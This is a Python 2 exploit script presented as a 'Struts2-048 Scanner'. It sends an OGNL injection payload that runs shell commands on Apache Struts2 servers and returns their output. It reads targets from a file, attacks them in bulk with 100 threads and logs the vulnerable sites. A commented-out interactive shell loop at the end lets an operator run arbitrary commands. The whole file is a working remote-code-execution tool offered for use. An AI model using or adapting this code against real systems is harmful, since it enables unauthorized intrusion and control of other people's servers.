#!/usr/bin/python

# -*- coding: utf-8 -*-



import json,re
import requests
import threading
import urllib
import argparse
import sys
import Queue
import time

def Poc(url):
    command = 'whoami'
    header = {'Content-Type': 'application/x-www-form-urlencoded'}
    poc = {"name":"%{(#szgx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' \
                          "+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}","age":"1","__checkbox_bustedBefore":"true","description":"123123"}
    data = urllib.urlencode(poc)
    

    url = queue.get(timeout=0.1)
 

    if not url.lower().startswith('http'):
        url = 'http://%s' % url   
    
    try:
        result = requests.post(url,data=data,headers=header)
        if result.status_code == 200:
            print "[+]Maybe S2-028 Website:   ",url
            print "[+]Whoami:  ",result.content
            
            f.write(url+"\n")
            f.write(result.content+"\n")

            print result.content
    except requests.ConnectionError,e:
        print e

if __name__ == '__main__':
    f=open("result.txt","a")
    
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,
                                     description='Struts2-048 Scanner. By Wangzuxian ',
                                     usage='self-048.py [options]')
    parser.add_argument('-f', metavar='File', type=str, default='url_list.txt',
                        help='New line delimited targets from File')
    parser.add_argument('-t', metavar='THREADS', type=int, default=100,
                        help='Num of scan threads, 100 by default')
    if len(sys.argv) == 1:
        sys.argv.append('-h')
    args = parser.parse_args()
    queue = Queue.Queue()
    for url in open(args.f).xreadlines():
        url = url.strip()
        if not url:
            continue
        for _url in url.split():
            queue.put(_url.strip().strip(','))
    start_time = time.time()
    threads = []
    for i in range(args.t):
        t = threading.Thread(target=Poc,args=(url,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()



#th = {"url":""}

#while True:
    #if th.get("url") != "":
        #input_cmd = raw_input("cmd >>: ")
        #if input_cmd == "exit":
            #exit()
        #elif input_cmd == 'set':
            #url = raw_input("set url :")
            #th['url'] = url
        #elif input_cmd == 'show url':
            #print th.get("url")
        #else:
            #Poc(th.get("url"),input_cmd)
    #else:
        #url = raw_input("set url :")
        #th["url"] = url
